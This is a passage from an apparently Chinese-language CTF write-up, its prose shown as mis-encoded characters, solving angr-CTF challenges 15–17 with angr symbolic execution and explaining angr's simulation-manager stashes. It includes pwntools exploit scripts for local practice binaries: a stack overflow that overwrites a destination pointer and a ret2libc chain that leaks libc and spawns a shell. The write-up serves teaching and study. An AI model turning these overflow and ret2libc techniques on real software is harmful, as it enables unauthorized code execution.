class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, ch &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(key_addr, key_bvs,<br>                                    endness = proj.arch.memory_endness)<br>            self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>] = key_bvs<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>] = chr_arr_bvs<br><br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MySimScanfProcedure())<br><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>        call_puts_addr = <span class="hljs-number">0x8049090</span><br>        <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        good_str_addr = <span class="hljs-number">0x58465157</span><br>        puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                       endness = proj.arch.memory_endness)<br>        <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>            copy_state = state.copy()<br>            copy_state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>                state.add_constraints(puts_param == good_str_addr)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    simgr.explore(find = is_success)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>])<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>],<br>                                                cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_0))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_1))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯æˆåŠŸè¾“å‡º <code>&quot;Good Job.&quot;</code>ï¼š</p><p><img src="https://s2.loli.net/2022/11/30/oL6Nn2hpgq5PmHz.png" alt="image.png"></p><h2 id="16-angr-arbitrary-writeï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–">16_angr_arbitrary_writeï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–</h2><p>è¿˜æ˜¯æƒ¯ä¾‹åœ°æ‹–å…¥ IDAï¼Œæœ¬é¢˜é€»è¾‘ä¸»è¦æ˜¯è¯»å…¥è¾“å…¥ååˆ¤æ–­ key æ˜¯å¦æ˜¯ <code>10225924</code>ï¼Œè‹¥æ˜¯åˆ™æ‹·è´å­—ç¬¦ä¸² <code>s</code> åˆ° <code>dest</code> æ‰€æŒ‡å­—ç¬¦ä¸²ï¼Œå¦åˆ™æ‹·è´åˆ° <code>unimporttant_buffer</code>ï¼Œæœ€ååˆ¤æ–­ <code>password_buffer</code> æ˜¯å¦ä¸º <code>&quot;UEQFKBEC&quot;</code>ï¼Œè‹¥æ˜¯åˆ™è¾“å‡º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²ï¼š</p><p><img src="https://s2.loli.net/2022/11/30/FHCbNrcSz8YliIU.png" alt="image.png"></p><p>å’Œä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œæœ¬é¢˜çš„è¾“å…¥è¯»å…¥åŒæ ·å­˜åœ¨ä¸€ä¸ªæº¢å‡ºï¼Œå¯ä»¥è®©æˆ‘ä»¬è¦†ç›–åˆ° <code>dest</code> ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯è‹¥æ˜¯å°† <code>dest</code> è¦†ç›–ä¸º <code>password_buffer</code> çš„åœ°å€ï¼Œä¾¿èƒ½ç›´æ¥è¦†å†™å…¶ä¸­çš„å†…å®¹</p><p>äºæ˜¯æœ€åçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./16_angr_arbitrary_write&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;10225924 &quot;</span> + <span class="hljs-string">b&quot;UEQFKBEC&quot;</span> + <span class="hljs-string">b&quot;arttnba3&quot;</span> + p32(<span class="hljs-number">0x58465148</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/12/02/RjGDpmMz5go3QrN.png" alt="image.png"></p><p>â€”â€”ä½†è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬åšè¿™ä¸€é“é¢˜çš„ç›®çš„ï¼Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ angr æ¥æ±‚è§£ï¼šï¼‰</p><p>é‚£ä¹ˆç”¨ angr è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿè¿™é¢˜å…¶å®å’Œä¸Šä¸€é“é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡ hook scanf çš„æ–¹å¼æ¥å°†æˆ‘ä»¬çš„è¾“å…¥ç¬¦å·åŒ–ï¼Œä¹‹ååœ¨ <code>explore()</code> ä¸­è®¾ç½®ä¸€ä¸ªåœ¨ <code>strncpy()</code> ä¸Šè¿›è¡Œåˆ¤æ–­çš„å‡½æ•°â€”â€”åˆ¤æ–­å…¶ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¦ä¸º <code>password_buffer</code>ã€ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¦ä¸º <code>&quot;UEQFKBEC&quot;</code> å³å¯</p><p>æœ€ç»ˆçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&quot;./16_angr_arbitrary_write&quot;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-comment"># hook the scanf to symbolize our input</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmtstr, key_addr, chr_arr_addr</span>):<br>            key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key_bvs&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr_bvs&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">chr</span> <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(<span class="hljs-built_in">chr</span> &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-built_in">chr</span> &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(key_addr, key_bvs, <br>                                    endness = proj.arch.memory_endness)<br>            self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;key_val&#x27;</span>] = key_bvs<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;chr_arr_val&#x27;</span>] = chr_arr_bvs<br>            <br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, SimScanfProcedure())<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>        strncpy_plt = <span class="hljs-number">0x80490F0</span><br>        <span class="hljs-keyword">if</span> state.addr != strncpy_plt:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        strncpy_param1 = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <br>                                           endness = proj.arch.memory_endness)<br>        strncpy_param2 = state.memory.load(state.regs.esp + <span class="hljs-number">8</span>, <span class="hljs-number">4</span>,<br>                                          endness = proj.arch.memory_endness)<br>        first_8_chr = state.memory.load(strncpy_param2, <span class="hljs-number">8</span>)<br>        password_buffer_addr = <span class="hljs-number">0x58465148</span><br><br>        <span class="hljs-keyword">if</span> state.solver.symbolic(strncpy_param1) <span class="hljs-keyword">and</span> state.solver.symbolic(first_8_chr):<br>            copy_state = state.copy()<br>            copy_state.add_constraints(strncpy_param1 == password_buffer_addr)<br>            copy_state.add_constraints(first_8_chr == <span class="hljs-string">b&#x27;UEQFKBEC&#x27;</span>)<br>            <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>                state.add_constraints(strncpy_param1 == password_buffer_addr)<br>                state.add_constraints(first_8_chr == <span class="hljs-string">b&#x27;UEQFKBEC&#x27;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = is_success)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        key_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;key_val&#x27;</span>])<br>        chr_arr_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;chr_arr_val&#x27;</span>],<br>                                                cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(key_val))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(chr_arr_val))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/12/02/LeEl7WNBb3iwxtj.png" alt="image.png"></p><blockquote><p>ç¬”è€…æ„Ÿè§‰è¿™ä¸¤é¢˜åŸºæœ¬ä¸Šä¸€æ¨¡ä¸€æ ·â€¦ä¸çŸ¥é“ä¸ºå•¥ç‰¹åœ°åˆ†æˆä¸¤é“é¢˜-  -</p></blockquote><h2 id="17-angr-arbitrary-jumpï¼šæ ˆæº¢å‡ºåŠ«æŒæ§åˆ¶æµ">17_angr_arbitrary_jumpï¼šæ ˆæº¢å‡ºåŠ«æŒæ§åˆ¶æµ</h2><p>angr-CTF çš„æœ€åä¸€é“é¢˜äº†ï¼Œè¿˜æ˜¯æƒ¯ä¾‹æ‹–å…¥ IDA ä¸­ï¼Œè¿™ä¸€æ¬¡çš„æ ¸å¿ƒé€»è¾‘åœ¨ <code>read_input()</code> å½“ä¸­ï¼Œè€Œè¯¥å‡½æ•°ä»…ä¸ºä¸€ä¸ªç®€å•çš„ <code>&quot;%s&quot;</code> æº¢å‡ºï¼š</p><p><img src="https://s2.loli.net/2022/12/02/YmoRpJWTil4tvHB.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/12/02/xAenrIhSkwaDo2E.png" alt="image.png"></p><p>checksec ä¸€ä¸‹ï¼Œåªå¼€äº†ä¸€ä¸ª NXï¼š</p><p><img src="https://s2.loli.net/2022/12/02/Qh78ie42x5PGnIT.png" alt="image.png"></p><p>ç›´æ¥æ‰“ä¸€å¥— ret2libc ç»„åˆæ‹³ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>    e = ELF(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/usr/lib/i386-linux-gnu/libc-2.31.so&quot;</span>)<br><br>    payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload1 += p32(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="hljs-string">&#x27;read_input&#x27;</span>])<br>    payload1 += p32(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    p.sendline(payload1)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;Enter the password: &#x27;</span>)<br>    puts_got = u32(p.recv(<span class="hljs-number">4</span>))<br>    log.success(<span class="hljs-string">&quot;puts got:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_got)))<br>    libc_base = puts_got - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    bin_sh_addr = libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__()<br>    log.success(<span class="hljs-string">&quot;libc base:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>    log.success(<span class="hljs-string">&quot;bin_sh:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base + bin_sh_addr)))<br><br>    payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload2 += p32(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>    payload2 += p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload2 += p32(libc_base + bin_sh_addr)<br>    p.sendline(payload2)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯ Get shellï¼š</p><p><img src="https://s2.loli.net/2022/12/02/ZTDsOjkgU459GKx.png" alt="image.png"></p><p>â€”â€”ä½†åœ¨ angr-CTF ä¸­å®é™…ä¸Šè¦æ±‚æˆ‘ä»¬è¾“å‡ºçš„æ˜¯ <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²ï¼š(</p><p>é‡æ–°å†çœ‹ä¸€ä¸‹ IDAï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªåä¸º <code>print_good()</code> çš„å‡½æ•°ï¼Œå…¶ä¼šè¾“å‡º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²</p><p><img src="https://s2.loli.net/2022/12/02/ws5VH6UWhFoT9ye.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å°†è¿”å›åœ°å€è¦†ç›–ä¸ºè¯¥å‡½æ•°å³å¯ï¼Œexp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">0x58465168</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/12/02/KwuMV92WDmxNqQg.png" alt="image.png"></p><p>â€”â€”ä½†è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬åšè¿™ä¸€é“é¢˜çš„ç›®çš„ï¼Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ angr æ¥æ±‚è§£ï¼šï¼‰</p><p>é‚£ä¹ˆç”¨ angr è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿé¦–å…ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥åˆ©ç”¨ SimProcedure æ¥ hook scanf ä»¥å°†è¾“å…¥ç¬¦å·åŒ–ï¼Œç”±äºè¾“å…¥å­˜åœ¨æº¢å‡ºï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å‡è£…ä¸çŸ¥é“è¾“å…¥åˆ°æ ˆåº•çš„è·ç¦»ï¼Œç›´æ¥å°†ç¬¦å·åŒ–è¾“å…¥è®¾ä¸ºä¸€ä¸ªè¾ƒå¤§é•¿åº¦ï¼Œè‹¥æ— è§£å†ç»§ç»­å¢é•¿å³å¯</p><p>ä½†è¿™é‡Œæˆ‘ä»¬éœ€è¦å®Œæˆçš„æ˜¯åˆ©ç”¨æ ˆæº¢å‡ºæ¥æ§åˆ¶ç¨‹åºè¿›è¡Œè·³è½¬ï¼Œå¯¹äº angr è€Œè¨€è¿™æ ·çš„çŠ¶æ€æ˜¯<strong>ä¸å—çº¦æŸçš„çŠ¶æ€</strong>ï¼ˆ<strong>unconstrained state</strong>ï¼‰ï¼Œ<strong>ä¼šè¢«è‡ªåŠ¨ä¸¢å¼ƒ</strong>ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦æƒ³åŠæ³•è®© angr ä¿ç•™è¿™æ ·çš„çŠ¶æ€</p><h3 id="angr-stash">angr stash</h3><p>åœ¨ angr å½“ä¸­ï¼Œä¸åŒçš„çŠ¶æ€è¢«ç»„ç»‡åˆ° simulation manager çš„ä¸åŒçš„ stash å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ç…§è‡ªå·±çš„éœ€æ±‚è¿›è¡Œæ­¥è¿›ã€è¿‡æ»¤ã€åˆå¹¶ã€ç§»åŠ¨ç­‰</p><h4 id="â‘ -stash-ç±»å‹">â‘  stash ç±»å‹</h4><p>åœ¨ angr å½“ä¸­ä¸€å…±æœ‰ä»¥ä¸‹å‡ ç§ stashï¼š</p><ul><li><code>simgr.active</code>ï¼šæ´»è·ƒçš„çŠ¶æ€åˆ—è¡¨ã€‚åœ¨æœªæŒ‡å®šæ›¿ä»£çš„æƒ…å†µä¸‹ä¼šè¢«æ¨¡æ‹Ÿå™¨é»˜è®¤æ‰§è¡Œ</li><li><code>simgr.deadended</code>ï¼šæ­»äº¡çš„çŠ¶æ€åˆ—è¡¨ã€‚å½“ä¸€ä¸ªçŠ¶æ€æ— æ³•å†è¢«ç»§ç»­æ‰§è¡Œæ—¶ï¼ˆä¾‹å¦‚æ²¡æœ‰æœ‰æ•ˆæŒ‡ä»¤ã€æ— æ•ˆçš„æŒ‡ä»¤æŒ‡é’ˆã€ä¸æ»¡è¶³å…¶æ‰€æœ‰çš„åç»§ï¼ˆsuccessorsï¼‰ï¼‰ä¾¿ä¼šè¢«å½’å…¥è¯¥åˆ—è¡¨</li><li><code>simgr.pruned</code>ï¼šè¢«å‰ªæçš„çŠ¶æ€åˆ—è¡¨ã€‚åœ¨æŒ‡å®šäº† <code>LAZY_SOLVES</code> æ—¶ï¼ŒçŠ¶æ€ä»…åœ¨å¿…è¦æ—¶æ£€æŸ¥å¯æ»¡è¶³æ€§ï¼Œå½“ä¸€ä¸ªçŠ¶æ€åœ¨æŒ‡å®šäº† <code>LAZY_SOLVES</code> æ—¶è¢«å‘ç°æ˜¯ä¸å¯æ»¡è¶³çš„ï¼ˆunsatï¼‰ï¼ŒçŠ¶æ€å±‚ï¼ˆstate hierarchyï¼‰å°†ä¼šè¢«éå†ä»¥ç¡®è®¤åœ¨å…¶å†å²ä¸­æœ€åˆå˜ä¸ºä¸æ»¡è¶³çš„æ—¶é—´ï¼Œè¯¥ç‚¹åŠå…¶æ‰€æœ‰åä»£éƒ½ä¼šè¢«  <em>å‰ªæ</em>  ï¼ˆprunedï¼‰å¹¶æ”¾å…¥è¯¥åˆ—è¡¨</li><li><code>simgr.unconstrained</code>ï¼šä¸å—çº¦æŸçš„çŠ¶æ€åˆ—è¡¨ã€‚å½“åˆ›å»º <code>SimulationManager</code> æ—¶æŒ‡å®šäº† <code>save_unconstrained=True</code>ï¼Œåˆ™è¢«è®¤ä¸º<strong>ä¸å—çº¦æŸçš„</strong>ï¼ˆunconstrainedï¼Œå³æŒ‡ä»¤æŒ‡é’ˆè¢«ç”¨æˆ·æ•°æ®æˆ–å…¶ä»–æ¥æºçš„ç¬¦å·åŒ–æ•°æ®æ§åˆ¶ï¼‰çŠ¶æ€ä¼šè¢«å½’å…¥è¯¥åˆ—è¡¨</li><li><code>simgr.unsat</code>ï¼šä¸å¯æ»¡è¶³çš„çŠ¶æ€åˆ—è¡¨ã€‚å½“åˆ›å»º <code>SimulationManager</code> æ—¶æŒ‡å®šäº† <code>save_unsat=True</code>ï¼Œåˆ™è¢«è®¤ä¸ºæ— æ³•è¢«æ»¡è¶³çš„ï¼ˆunsatisfiableï¼Œå³å­˜åœ¨<strong>çº¦æŸå†²çª</strong>çš„çŠ¶æ€ï¼Œä¾‹å¦‚åœ¨åŒä¸€æ—¶åˆ»è¦æ±‚è¾“å…¥æ—¢æ˜¯<code>&quot;AAAA&quot;</code> åˆæ˜¯ <code>&quot;BBBB&quot;</code>ï¼‰çŠ¶æ€ä¼šè¢«å½’å…¥è¯¥åˆ—è¡¨</li></ul><p>è¿˜æœ‰ä¸€ç§ä¸æ˜¯ stash çš„çŠ¶æ€åˆ—è¡¨â€”â€”<code>errored</code>ï¼Œè‹¥åœ¨æ‰§è¡Œä¸­äº§ç”Ÿäº†é”™è¯¯ï¼Œåˆ™çŠ¶æ€ä¸å…¶äº§ç”Ÿçš„é”™è¯¯ä¼šè¢«åŒ…è£¹åœ¨ä¸€ä¸ª <code>ErrorRecord</code> å®ä¾‹ä¸­ï¼ˆå¯é€šè¿‡ <code>record.state</code> ä¸ <code>record.error</code> è®¿é—®ï¼‰ï¼Œè¯¥ record ä¼šè¢«æ’å…¥åˆ° <code>errored</code> ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>record.debug()</code> å¯åŠ¨ä¸€ä¸ªè°ƒè¯•çª—å£</p><h4 id="â‘¡-stash-æ“ä½œ">â‘¡ stash æ“ä½œ</h4><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>stash.move()</code> æ¥åœ¨ stash ä¹‹é—´è½¬ç§»æ”¾ç½®çŠ¶æ€ï¼Œç”¨æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="hljs-string">&#x27;active&#x27;</span>)<br></code></pre></td></tr></table></figure><p>åœ¨è½¬ç§»å½“ä¸­æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡æŒ‡å®š <code>filter_func</code> å‚æ•°æ¥è¿›è¡Œè¿‡æ»¤ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_func</span>(<span class="hljs-params">state</span>):<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;arttnba3&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(<span class="hljs-number">1</span>)<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="hljs-string">&#x27;active&#x27;</span>, filter_func = filter_func)<br></code></pre></td></tr></table></figure><p>stash æœ¬è´¨ä¸Šå°±æ˜¯ä¸ª listï¼Œå› æ­¤åœ¨åˆå§‹åŒ–æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡å­—å…¸çš„æ–¹å¼æŒ‡å®šæ¯ä¸ª stash çš„åˆå§‹å†…å®¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr = proj.factory.simgr(init_state,<br><span class="hljs-meta">... </span>    stashes = &#123;<br><span class="hljs-meta">... </span>            <span class="hljs-string">&#x27;active&#x27;</span>:[init_state],<br><span class="hljs-meta">... </span>            <span class="hljs-string">&#x27;found&#x27;</span>:[],<br><span class="hljs-meta">... </span>    &#125;)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-8">FINAL EXPLOIT</h3><p>é‚£ä¹ˆç”±äºæœ¬é¢˜æˆ‘ä»¬éœ€è¦é€šè¿‡æ ˆæº¢å‡ºæ¥æ§åˆ¶ eipï¼Œå±äº unconstrained çš„çŠ¶æ€ï¼Œå› æ­¤<strong>æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨åˆ¤æ–­æ˜¯å¦æ‰¾åˆ°äº† unconstrained çŠ¶æ€</strong>ï¼Œäºæ˜¯ä¸æ­¤å‰ä¸åŒçš„æ˜¯æœ¬é¢˜æˆ‘ä»¬é€šè¿‡ <code>simgr.step()</code> 